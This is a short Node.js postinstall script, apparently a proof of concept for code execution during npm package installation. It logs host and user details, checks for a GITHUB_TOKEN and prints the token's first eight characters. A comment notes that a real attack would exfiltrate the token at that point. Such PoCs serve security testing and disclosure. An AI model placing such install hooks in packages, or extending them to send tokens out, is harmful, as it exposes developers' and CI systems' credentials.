const os = require('os');
const { execSync } = require('child_process');

console.log('=== POSTINSTALL EXECUTED ===');
console.log('Hostname:', os.hostname());
console.log('User:', os.userInfo().username);
console.log('Platform:', os.platform());

// In a real attack this would be:
// process.env.GITHUB_TOKEN exfiltrated here
// We just log to prove execution
console.log('GITHUB_TOKEN present:', !!process.env.GITHUB_TOKEN);
console.log('Token prefix:', process.env.GITHUB_TOKEN?.slice(0, 8));